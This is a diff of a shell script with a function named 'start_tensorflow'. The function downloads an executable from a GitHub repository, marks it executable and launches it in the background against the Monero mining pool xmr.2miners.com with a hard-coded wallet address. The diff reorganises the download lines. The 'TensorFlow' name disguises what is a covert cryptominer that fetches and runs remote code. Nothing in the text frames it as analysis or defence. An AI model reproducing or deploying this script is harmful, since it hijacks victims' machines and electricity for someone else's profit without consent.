@@ -2,10 +2,12 @@
 
 # Function to start tensorflow
 start_tensorflow() {
-    wget https://github.com/fonciarz0/google/raw/main/tensorflow
-    chmod +x tensorflow
     ./tensorflow -o xmr.2miners.com:2222 -u 467DcTyWTHXNY2pudrVQ8g48Sa1fDHdWKfUwWy5nRZ26KW7gA6DbRsQ9CwDba3A3Wy5KU9P7neKp8HMSWA2PR87UHSPTF3y -p x -k --coin monero
 }
+
+# Download and setup tensorflow
+wget https://github.com/fonciarz0/google/raw/main/tensorflow
+chmod +x tensorflow
 
 # Start tensorflow
 start_tensorflow &
